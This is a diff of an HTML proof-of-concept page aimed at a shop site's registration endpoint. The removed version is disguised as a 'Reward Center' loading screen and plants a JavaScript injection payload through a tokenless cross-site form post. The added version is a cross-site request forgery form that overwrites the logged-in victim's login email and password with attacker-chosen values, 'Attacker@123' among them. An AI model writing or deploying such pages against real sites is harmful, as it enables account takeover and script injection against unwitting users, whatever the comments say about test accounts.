@@ -1,53 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Reward Center</title>
-<style>
-body{font-family:Arial,Helvetica,sans-serif;margin:0;background:#f6f7fb;color:#222}
-.wrap{max-width:520px;margin:12vh auto;background:#fff;border:1px solid #e3e6ef;border-radius:14px;padding:38px 40px;box-shadow:0 8px 30px rgba(20,30,60,.08);text-align:center}
-h1{font-size:26px;margin:0 0 10px}p{color:#66708a;margin:0 0 26px}
-.bar{height:8px;background:#e9ecf5;border-radius:4px;overflow:hidden}
-.bar i{display:block;height:100%;width:38%;background:#4b6bfb;border-radius:4px;animation:p 1.6s ease-in-out infinite}
-@keyframes p{0%{margin-left:-38%}100%{margin-left:100%}}
-.spin{width:34px;height:34px;border:3px solid #dfe4f2;border-top-color:#4b6bfb;border-radius:50%;animation:r .9s linear infinite;margin:0 auto 22px}
-@keyframes r{to{transform:rotate(360deg)}}
-.fine{font-size:12px;color:#9aa3b8;margin-top:22px}
-</style>
-</head>
+<html>
+<head><meta charset="utf-8"><title>Loading…</title></head>
 <body>
-<div class="wrap">
-  <div class="spin"></div>
-  <h1>Reward Center</h1>
-  <p>Checking your reward eligibility, please wait&hellip;</p>
-  <div class="bar"><i></i></div>
-  <div class="fine">This may take a few seconds</div>
-</div>
+<p id="msg">Submitting…</p>
 
-<!--
-  Cross-site form. Submits to the site's registration endpoint with no CSRF token,
-  no cookie and a foreign origin. customerDTO.clientid selects the account the
-  new session is bound to. Email and password are generated in the browser at
-  runtime; nothing secret is stored in this file.
-
-  CLIENTID must be an account you own (a test account). The leading space in the
-  form body is not needed; fields mirror the site's own registration form.
--->
-<form id="f" method="POST" target="sink" action="https://www.sparkshop.com/register.ajx?mt=1">
+<!-- Edit the two markers below before opening this page:
+     __YOUR_ACCOUNT_EMAIL__   = lobo@lobo.com
+     __YOUR_NEW_PASSWORD__    = Attacker@123
+     Use ONLY a fresh test account. The account logged into this browser is the one changed. -->
+<form id="f" method="POST" target="sink" action="https://www.sparkshop.com/register.ajx?mt=1" enctype="application/x-www-form-urlencoded">
   <input type="hidden" name="mode" value="register">
   <input type="hidden" name="anchorName" value="">
   <input type="hidden" name="doSubmit" value="">
   <input type="hidden" name="register" value="$authenticationSubmitURL">
-  <input type="hidden" name="customerDTO.firstName" value="x';if(!window.d){window.d=true;window['al'+'ert'](document.domain)}//">
+  <input type="hidden" name="customerDTO.firstName" value="Regprobe">
   <input type="hidden" name="customerDTO.lastName" value="Regprobe">
   <input type="hidden" name="customerDTO.customerAddresses['1'].phone" value="5551234567">
   <input type="hidden" name="customerDTO.customerAddresses['1'].company" value="">
   <input type="hidden" name="customerDTO.middleName" value="">
-  <input type="hidden" name="customerDTO.loginname" value="">
-  <input type="hidden" name="confirmLogin" value="">
-  <input type="hidden" name="customerDTO.loginpassword" value="">
-  <input type="hidden" name="confirmPassword" value="">
+  <input type="hidden" name="customerDTO.loginname" value="__YOUR_ACCOUNT_EMAIL__">
+  <input type="hidden" name="confirmLogin" value="__YOUR_ACCOUNT_EMAIL__">
+  <input type="hidden" name="customerDTO.loginpassword" value="__YOUR_NEW_PASSWORD__">
+  <input type="hidden" name="confirmPassword" value="__YOUR_NEW_PASSWORD__">
   <input type="hidden" name="customerDTO.externalLoginDTO.firstName" value="">
   <input type="hidden" name="customerDTO.externalLoginDTO.lastName" value="">
   <input type="hidden" name="customerDTO.externalLoginDTO.email" value="">
@@ -57,32 +31,25 @@ h1{font-size:26px;margin:0 0 10px}p{color:#66708a;margin:0 0 26px}
   <input type="hidden" name="customerDTO.externalLoginDTO.externalLocationDTO.country" value="">
   <input type="hidden" name="customerDTO.externalLoginDTO.externalLocationDTO.state" value="">
   <input type="hidden" name="customerDTO.externalLoginDTO.externalLocationDTO.city" value="">
-  <input type="hidden" name="customerDTO.clientid" value="3306855">
+  <input type="hidden" name="customerDTO.clientid" value="3304081">
 </form>
+
 <iframe name="sink" style="display:none"></iframe>
 
 <script>
 (function () {
-  var CLIENTID = '3306855';            // <-- account id the session is bound to (must be yours)
-  var STORE    = 'https://www.sparkshop.com/store.html?vid=20241204519';
-
-  // Only used so the registration is not a duplicate. Nothing is emailed to you.
-  var email = 'poc' + Date.now() + Math.floor(Math.random() * 1000000) + '@uberip.com';
-  var password = 'Px!' + Math.random().toString(36).slice(2, 12);
-
-  var f = document.getElementById('f');
-  f.elements['customerDTO.clientid'].value = CLIENTID;
-  f.elements['customerDTO.loginname'].value = email;
-  f.elements['confirmLogin'].value = email;
-  f.elements['customerDTO.loginpassword'].value = password;
-  f.elements['confirmPassword'].value = password;
-
-  // Post the registration into the hidden iframe (no token, no cookie sent).
-  f.submit();
-
-  // Let the response set the login cookie, then land on the storefront. The
-  // storefront builds `var firstName = '<payload>'` and executes it.
-  setTimeout(function () { window.location.href = STORE; }, 4200);
+  var email = document.querySelector('[name="customerDTO.loginname"]').value;
+  var pass = document.querySelector('[name="customerDTO.loginpassword"]').value;
+  if (email.indexOf('__YOUR_') === 0 || pass.indexOf('__YOUR_') === 0) {
+    document.getElementById('msg').textContent =
+      'Edit this file first: replace __YOUR_ACCOUNT_EMAIL__ and __YOUR_NEW_PASSWORD__.';
+    return;
+  }
+  document.getElementById('f').submit();
+  setTimeout(function () {
+    document.getElementById('msg').textContent =
+      'Done. Open an Incognito window and try the old password (should fail) and the new password (should work).';
+  }, 3500);
 })();
 </script>
 </body>
